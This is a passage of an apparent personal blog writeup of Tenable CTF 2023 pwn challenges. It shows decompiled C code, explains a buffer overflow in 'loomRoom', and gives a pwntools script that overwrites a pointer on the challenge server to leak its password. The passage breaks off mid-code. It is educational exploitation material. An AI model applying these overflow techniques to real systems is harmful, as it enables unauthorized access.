<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="IntroOn 8-9 August I and my team DaishoSec has participated in Tenable CTF 2023, it was a good CTF experience, and as I’m a pwn&#x2F;rev player I would say that their pwn&#x2F;rev challenge is really">
<meta property="og:type" content="article">
<meta property="og:title" content="Tenable CTF 2023 Writeups">
<meta property="og:url" content="https://nkd3v.github.io/2023/08/12/Tenable-CTF-2023/index.html">
<meta property="og:site_name" content="0xsh">
<meta property="og:description" content="IntroOn 8-9 August I and my team DaishoSec has participated in Tenable CTF 2023, it was a good CTF experience, and as I’m a pwn&#x2F;rev player I would say that their pwn&#x2F;rev challenge is really">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://nkd3v.github.io/2023/08/12/Tenable-CTF-2023/tenable2023-our-team.png">
<meta property="og:image" content="https://nkd3v.github.io/2023/08/12/Tenable-CTF-2023/tenable2023-loom-pass-addr.png">
<meta property="og:image" content="https://nkd3v.github.io/2023/08/12/Tenable-CTF-2023/tenable2023-braggart-page.png">
<meta property="og:image" content="https://nkd3v.github.io/2023/08/12/Tenable-CTF-2023/tenable2023-braggart-get-pass-on-the-stack.png">
<meta property="og:image" content="https://nkd3v.github.io/2023/08/12/Tenable-CTF-2023/tenable2023-breggart-breg-address.png">
<meta property="article:published_time" content="2023-08-12T02:59:59.000Z">
<meta property="article:modified_time" content="2023-08-12T08:01:41.069Z">
<meta property="article:author" content="Narongpol Kijrangsan">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://nkd3v.github.io/2023/08/12/Tenable-CTF-2023/tenable2023-our-team.png">
    
    
      
        
          <link rel="shortcut icon" href="../../../../images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="../../../../images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="../../../../images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Tenable CTF 2023 Writeups</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="../../../../../css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="../../../../index.html">Home</a></li><!--
     --><!--
       --><li><a href="../../../../about/">About</a></li><!--
     --><!--
       --><li><a href="../../../../archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/nkd3v">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="../../21/CybergonCTF-2023-Writeups/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="../../08/ASCWG-2023-Writeups/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://nkd3v.github.io/2023/08/12/Tenable-CTF-2023/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://nkd3v.github.io/2023/08/12/Tenable-CTF-2023/&text=Tenable CTF 2023 Writeups"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://nkd3v.github.io/2023/08/12/Tenable-CTF-2023/&title=Tenable CTF 2023 Writeups"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://nkd3v.github.io/2023/08/12/Tenable-CTF-2023/&is_video=false&description=Tenable CTF 2023 Writeups"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Tenable CTF 2023 Writeups&body=Check out this article: https://nkd3v.github.io/2023/08/12/Tenable-CTF-2023/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://nkd3v.github.io/2023/08/12/Tenable-CTF-2023/&title=Tenable CTF 2023 Writeups"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://nkd3v.github.io/2023/08/12/Tenable-CTF-2023/&title=Tenable CTF 2023 Writeups"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://nkd3v.github.io/2023/08/12/Tenable-CTF-2023/&title=Tenable CTF 2023 Writeups"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://nkd3v.github.io/2023/08/12/Tenable-CTF-2023/&title=Tenable CTF 2023 Writeups"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://nkd3v.github.io/2023/08/12/Tenable-CTF-2023/&name=Tenable CTF 2023 Writeups&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://nkd3v.github.io/2023/08/12/Tenable-CTF-2023/&t=Tenable CTF 2023 Writeups"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Intro"><span class="toc-number">1.</span> <span class="toc-text">Intro</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reversing-Pwnable"><span class="toc-number">2.</span> <span class="toc-text">Reversing &#x2F; Pwnable</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Skiddyana-Pwnz-and-the-Loom-of-Fate"><span class="toc-number">2.1.</span> <span class="toc-text">Skiddyana Pwnz and the Loom of Fate</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Analysis"><span class="toc-number">2.1.1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Leak-the-password"><span class="toc-number">2.1.2.</span> <span class="toc-text">Leak the password</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Redirect-execution-flow-to-call-theVoid"><span class="toc-number">2.1.3.</span> <span class="toc-text">Redirect execution flow to call theVoid</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Braggart"><span class="toc-number">2.2.</span> <span class="toc-text">Braggart</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Analysis-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Leak-Password"><span class="toc-number">2.2.2.</span> <span class="toc-text">Leak Password</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Overwrite-brag-to-flag"><span class="toc-number">2.2.3.</span> <span class="toc-text">Overwrite brag to flag</span></a></li></ol></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Tenable CTF 2023 Writeups
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Narongpol Kijrangsan</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-08-12T02:59:59.000Z" class="dt-published" itemprop="datePublished">2023-08-12</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>On 8-9 August I and my team DaishoSec has participated in Tenable CTF 2023, it was a good CTF experience, and as I’m a pwn&#x2F;rev player I would say that their pwn&#x2F;rev challenge is really cool, it required the knowledge of JavaScript de-obfuscation,  buffer overflow, printf format string vulnerability, Nintendo game debugging and hacking, and an ability to precisely locate specific data in memory to pinpoint which varaible to read or write, I managed to help my team solve 2 challenges thus we ended up in 17th place with 5053 points by solving out of 14&#x2F;18 challenges</p>
<p><img src="tenable2023-our-team.png"></p>
<p>And now the challenge has ended, I would like to show you guys how I solved it and hope that this will help you in learning about binary exploitation, so let’s go!</p>
<h2 id="Reversing-Pwnable"><a href="#Reversing-Pwnable" class="headerlink" title="Reversing &#x2F; Pwnable"></a>Reversing &#x2F; Pwnable</h2><h3 id="Skiddyana-Pwnz-and-the-Loom-of-Fate"><a href="#Skiddyana-Pwnz-and-the-Loom-of-Fate" class="headerlink" title="Skiddyana Pwnz and the Loom of Fate"></a>Skiddyana Pwnz and the Loom of Fate</h3><p>Score: 424<br>Solve: 77&#x2F;1489</p>
<p>Description:</p>
<blockquote>
<p>Enter an ancient place, contrived beyond reason, and alter the fate of this world.<br>nc 0.cloud.chals.io 33616<br><a href="loom">loom</a></p>
</blockquote>
<p>File: <a href="loom">loom</a></p>
<h4 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h4><p>First, I use my favorite decompiler IDA to take a look at an interesting function and how it behaves</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> inputPassword[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-240h] BYREF</span></span><br><span class="line">  <span class="type">char</span> userProphecy[<span class="number">516</span>]; <span class="comment">// [rsp+20h] [rbp-220h] BYREF</span></span><br><span class="line">  <span class="type">char</span> choiceStr[<span class="number">8</span>]; <span class="comment">// [rsp+224h] [rbp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> choiceInt; <span class="comment">// [rsp+22Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">char</span> *password; <span class="comment">// [rsp+230h] [rbp-10h]</span></span><br><span class="line">  <span class="type">char</span> *prophecyPtr; <span class="comment">// [rsp+238h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  password = <span class="string">&quot;thisisnotthepassword&quot;</span>;</span><br><span class="line">  prophecyPtr = <span class="string">&quot;Drink your ovaltine&quot;</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\x1B[0;33m&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;  ____  _    _     _     _                           ____                     \n&quot;</span></span><br><span class="line">    <span class="string">&quot; / ___|| | _(_) __| | __| |_   _  __ _ _ __   __ _  |  _ \\__      ___ __  ____\n&quot;</span></span><br><span class="line">    <span class="string">&quot; \\___ \\| |/ / |/ _` |/ _` | | | |/ _` | &#x27;_ \\ / _` | | |_) \\ \\ /\\ / / &#x27;_ \\|_  /\n&quot;</span></span><br><span class="line">    <span class="string">&quot;  ___) |   &lt;| | (_| | (_| | |_| | (_| | | | | (_| | |  __/ \\ V  V /| | | |/ / \n&quot;</span></span><br><span class="line">    <span class="string">&quot; |____/|_|\\_\\_|\\__,_|\\__,_|\\__, |\\__,_|_| |_|\\__,_| |_|     \\_/\\_/ |_| |_/___|\n&quot;</span></span><br><span class="line">    <span class="string">&quot;                           |___/                                              \n&quot;</span></span><br><span class="line">    <span class="string">&quot;                                 _   _   _                                    \n&quot;</span></span><br><span class="line">    <span class="string">&quot;                  __ _ _ __   __| | | |_| |__   ___                           \n&quot;</span></span><br><span class="line">    <span class="string">&quot;                 / _` | &#x27;_ \\ / _` | | __| &#x27;_ \\ / _ \\                          \n&quot;</span></span><br><span class="line">    <span class="string">&quot;                | (_| | | | | (_| | | |_| | | |  __/                          \n&quot;</span></span><br><span class="line">    <span class="string">&quot;                 \\__,_|_| |_|\\__,_|  \\__|_| |_|\\___|                          \n&quot;</span></span><br><span class="line">    <span class="string">&quot;                                                                              \n&quot;</span></span><br><span class="line">    <span class="string">&quot;     _                                   __   _____     _                     \n&quot;</span></span><br><span class="line">    <span class="string">&quot;    | |    ___   ___  _ __ ___     ___  / _| |  ___|_ _| |_ ___               \n&quot;</span></span><br><span class="line">    <span class="string">&quot;    | |   / _ \\ / _ \\| &#x27;_ ` _ \\   / _ \\| |_  | |_ / _` | __/ _ \\              \n&quot;</span></span><br><span class="line">    <span class="string">&quot;    | |__| (_) | (_) | | | | | | | (_) |  _| |  _| (_| | ||  __/              \n&quot;</span></span><br><span class="line">    <span class="string">&quot;    |_____\\___/ \\___/|_| |_| |_|  \\___/|_|   |_|  \\__,_|\\__\\___|              \n&quot;</span></span><br><span class="line">    <span class="string">&quot;     &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\x1B[0m&quot;</span>);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\n\n=============================================================================&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;Choose your next move:\n&quot;</span></span><br><span class="line">        <span class="string">&quot;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;1) Enter the room of the loom\n&quot;</span></span><br><span class="line">        <span class="string">&quot;2) Read the wall of prophecy\n&quot;</span></span><br><span class="line">        <span class="string">&quot;3) Enter the room of the fates\n&quot;</span></span><br><span class="line">        <span class="string">&quot;4) leave\n&quot;</span></span><br><span class="line">        <span class="string">&quot;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">      fgets(choiceStr, <span class="number">8</span>, _bss_start);</span><br><span class="line">      choiceInt = atoi(choiceStr);</span><br><span class="line">      <span class="keyword">if</span> ( choiceInt != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      prophecyPtr = loomRoom(prophecyPtr, userProphecy);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> ( choiceInt )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\n\nYou look to the grand wall in front of you.\nA prophecy is etched into the stone and looks ancient : \n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, prophecyPtr);</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\n\nBefore you is a large stone door. As you behold it, you hear a voice inside of your head.&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n\nSpeak the unpronouncable phrase to pass to the room of fates : \n\n&gt; &quot;</span>);</span><br><span class="line">        fgets(inputPassword, <span class="number">26</span>, _bss_start);</span><br><span class="line">        inputPassword[<span class="built_in">strlen</span>(inputPassword) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(inputPassword, password) )</span><br><span class="line">          fatesRoom(prophecyPtr);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;\nThe door does not open, the voice is silent.&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\nYou get confused and try to walk in a direction that doesn&#x27;t exist. It doesn&#x27;t work.&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>We can see that we can choose 4 choice each of the choice can be briefly explain as the following </p>
<ol>
<li>Enter the room of the loom: call function <code>loomRoom(prophecyPtr, userProphecy)</code> and return something to <code>prophecyPtr</code> which will be used in choice 2 and and choice 3</li>
<li>Read the wall of prophecy: print the content pointed by <code>prophecyPtr</code></li>
<li>Enter the room of the fates: ask user for a password, in the case of our local binary it’s <code>thisisnotthepassword</code> but this could not be say for the binary on the server and we have to find a way to leak it, and if a user enter the correct password <code>fatesRoom(prophecyPtr)</code> will be called</li>
<li>leave: exit program</li>
</ol>
<p>Apart those functions there’s also a function called <code>theVoid</code> which is not called or reference anyway, so the only way to reach them is though exploitation in some way.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">theVoid</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nYou stretch the fabric of this reality, its premise worn thin.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n...th...this is what you destroyed reality for?\nOk. Well. It&#x27;s yours.\n&quot;</span>);</span><br><span class="line">  stream = fopen(<span class="string">&quot;/home/ctf/flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( v1 != <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = fgetc(stream);</span><br><span class="line">      <span class="built_in">putchar</span>(v1);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(stream);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>After analysis, I can say that this is definitely the function that we have to call if we want to get the flag.</p>
<h4 id="Leak-the-password"><a href="#Leak-the-password" class="headerlink" title="Leak the password"></a>Leak the password</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">loomRoom</span><span class="params">(<span class="type">char</span> *oldProphercyPtr, <span class="type">char</span> *userProphecyPtr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> userProphecyInput[<span class="number">268</span>]; <span class="comment">// [rsp+10h] [rbp-120h] BYREF</span></span><br><span class="line">  <span class="type">char</span> choiceStr[<span class="number">8</span>]; <span class="comment">// [rsp+11Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">int</span> choiceInt; <span class="comment">// [rsp+124h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">char</span> *prophecyPtr; <span class="comment">// [rsp+128h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  prophecyPtr = oldProphercyPtr;</span><br><span class="line">  <span class="built_in">memset</span>(userProphecyInput, <span class="number">0</span>, <span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n\n=============================================================================\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;You enter the room of the loom, and see the loom of fate before you. You can etch a prophecy into the futre, or leav&quot;</span></span><br><span class="line">    <span class="string">&quot;e the future alone.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;1) Prophesize\n&quot;</span></span><br><span class="line">    <span class="string">&quot;2) Leave\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  fgets(choiceStr, <span class="number">8</span>, _bss_start);</span><br><span class="line">  choiceInt = atoi(choiceStr);</span><br><span class="line">  <span class="keyword">if</span> ( choiceInt == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    fgets(userProphecyInput, <span class="number">286</span>, _bss_start);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(userProphecyInput) &lt;= <span class="number">256</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      prophecyPtr = userProphecyPtr;</span><br><span class="line">      <span class="built_in">strcpy</span>(userProphecyPtr, userProphecyInput);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\nWhoa whoa, slow down, that&#x27;s too much prophecy. Life needs some mystery.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> prophecyPtr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>We can see that <code>loomRoom</code> allow user to input their own prophecy but there’s some problem, if we look at line 3 <code>char userProphecyInput[268]</code> and line 22 <code>fgets(userProphecyInput, 286, _bss_start);</code>, we will notice that the <code>fgets</code> read input more than <code>userProphecyInput</code> buffer can hold, which will overflow and allow us to overwrite <code>choiceStr</code>, <code>choiceInt</code>, and <code>prophecyPtr</code> to any value as we like but still not large enough to allow us to overwrite return address on the stack</p>
<p>My idea is to overwrite to <code>prophecyPtr</code> to point to address of the password which is <code>0x40232a</code> as stated in IDA</p>
<p><img src="tenable2023-loom-pass-addr.png"></p>
<p>Then choose the choice 2 to print the actual password stored in the Tenable’s server, here’s how I go about it:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./loom&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process()</span></span><br><span class="line">io = remote(<span class="string">&quot;0.cloud.chals.io&quot;</span>, <span class="number">33616</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">payload = flat(&#123;<span class="number">280</span>: <span class="string">b&#x27;\x2a\x23\x40\x00\x00&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Choose your next move&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;You enter the room of the loom&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.wait(timeout=<span class="number">0.1</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Choose your next move&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.clean()</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">x = <span class="string">b&#x27;\x2a\x23\x40\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure>

<p>And here’s the password: <code>QjVHST7M11cY7Ws6mXU1</code></p>
<h4 id="Redirect-execution-flow-to-call-theVoid"><a href="#Redirect-execution-flow-to-call-theVoid" class="headerlink" title="Redirect execution flow to call theVoid"></a>Redirect execution flow to call <code>theVoid</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">fatesRoom</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *prophecyPtr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">132</span>]; <span class="comment">// [rsp+10h] [rbp-90h] BYREF</span></span><br><span class="line">  <span 